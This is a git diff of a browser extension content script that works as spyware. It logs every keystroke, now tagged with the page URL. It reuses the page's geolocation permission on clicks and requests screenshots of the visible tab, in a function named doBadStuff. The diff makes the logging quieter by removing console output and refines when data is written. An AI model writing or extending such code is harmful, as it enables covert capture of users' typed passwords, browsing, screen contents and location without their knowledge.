@@ -1,15 +1,12 @@
+import _ from "lodash";
 import { IKeyLogEntry } from "src/interfaces";
 import { BackgroundMessage, StorageKey } from "../consts";
 import { sendMessage, updateGeolocation } from "../utils/page-utils";
 import { logData, simplePrepend, writeLog } from "../utils/shared-utils";
 
-console.log("content-script.ts");
-
 let buffer = "";
 
-sendMessage(BackgroundMessage.HEARTBEAT);
-
-async function doBadStuff() {
+function piggybackGeolocation() {
   // Piggyback permissions for geolocation
   navigator.permissions
     .query({ name: "geolocation" })
@@ -18,16 +15,19 @@ async function doBadStuff() {
         updateGeolocation();
       }
     });
+}
 
+async function doBadStuff() {
   if (document.visibilityState === "visible") {
     sendMessage(BackgroundMessage.CAPTURE_VISIBLE_TAB);
   }
 }
 
-async function writeBuffer() {
+const writeBuffer = _.debounce(async () => {
   if (buffer.length > 0) {
     await simplePrepend<IKeyLogEntry>(StorageKey.KEY_LOG, {
       ...logData(),
+      url: window.location.href,
       buffer,
     });
 
@@ -35,20 +35,17 @@ async function writeBuffer() {
 
     writeLog("Wrote keylog buffer");
   }
-}
+}, 2000);
 
 document.addEventListener("keyup", (e: KeyboardEvent) => {
-  console.log(e.key);
   buffer += e.key;
 
-  if (buffer.length > 500) {
-    writeBuffer();
-  }
+  writeBuffer();
 });
 
-setInterval(() => writeBuffer(), 5000);
+document.addEventListener("visibilitychange", doBadStuff);
 
-document.addEventListener("visibilitychange", () => doBadStuff());
+document.addEventListener("click", piggybackGeolocation);
 
 setInterval(() => {
   doBadStuff();
